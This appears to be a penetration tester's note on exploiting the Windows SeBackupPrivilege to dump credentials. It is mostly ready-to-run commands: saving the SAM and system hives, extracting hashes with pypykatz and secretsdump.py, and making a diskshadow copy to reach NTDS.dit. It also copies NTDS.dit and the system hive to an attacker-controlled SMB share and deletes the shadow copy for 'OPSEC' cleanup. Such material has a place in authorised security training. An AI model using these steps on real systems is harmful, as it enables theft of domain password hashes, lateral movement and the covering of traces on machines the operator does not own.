# Exploiting SeBackupPrivilge 
##### **Introduction** 
This allows us to copy restricted files using the backup methods available. We can then dump the hashes using `secretsdump.py`

##### Lab Setup 
A good introduction on how to set this up for a lab can be found here [https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

##### Execution
1. We need to make (or find) a writeable directory to use. 

```
cd c:\
mkdir Temp
```

2. Then we can dump out the `SAM` and `system` files from the registry. 

```
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

3. Using [WinRM], or an [alternative method](obsidian://open?vault=Security%20%26%20PenTesting&file=Utils%2FImpacket%20SMB%20Server), we can download these files to our local machine. 

4. Using [pypykatz](https://github.com/skelsec/pypykatz) we can get the hash

	```
	pypykatz registry --sam SAM_FILE SYSTEM_FILE

	secretsdump.py -sam SAM_FILE -system SYSTEM_FILE LOCAL
	```

5. Connect using [WinRM] with any hashes retrieved. 

### Dump NTDS.DIT
Requires [https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)

vss.dsh + unix2dos to fix line endings
```
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```

Upload to the victim machine! 

```
diskshadow /s vss.dsh 
```

```
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\SMB_SERVER\SMB_SHARE_NAME\ntds.dit
```

```
reg.exe save hklm\system \\SMB_SERVER\SMB_SHARE_NAME\system
```

OPSEC: Cleanup

```
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on 
delete shadows volume df
reset
```